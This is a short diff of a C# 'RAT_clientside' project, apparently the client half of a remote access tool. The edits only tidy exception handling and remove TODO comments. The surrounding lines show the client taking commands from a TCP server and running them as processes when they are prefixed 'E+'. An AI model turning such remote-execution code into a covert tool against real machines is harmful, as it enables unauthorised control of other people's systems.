@@ -26,7 +26,7 @@ namespace RAT_clientside
                 connectedToServerTcpClient.Dispose();
                 return true;
             }
-            catch (Exception e)
+            catch (Exception)
             {
                 return false;
             }
@@ -67,12 +67,11 @@ namespace RAT_clientside
                         catch (Exception e)
                         {
                             Console.WriteLine(e);
-                            //TODO Break the loop if ioException is thrown
                         } //Get the Command
 
                         if (cmd.StartsWith("E+"))
                         {
-                            string exeCmd = cmd.Substring(2); //TODO check if 2 is the correct number
+                            string exeCmd = cmd.Substring(2);
                             Console.WriteLine("E");
 
                             Process cmdProcess = new Process();
@@ -125,7 +124,6 @@ namespace RAT_clientside
                         catch (Exception e)
                         {
                             Console.WriteLine(e);
-                            throw;
                         }
 
                         output = string.Empty;
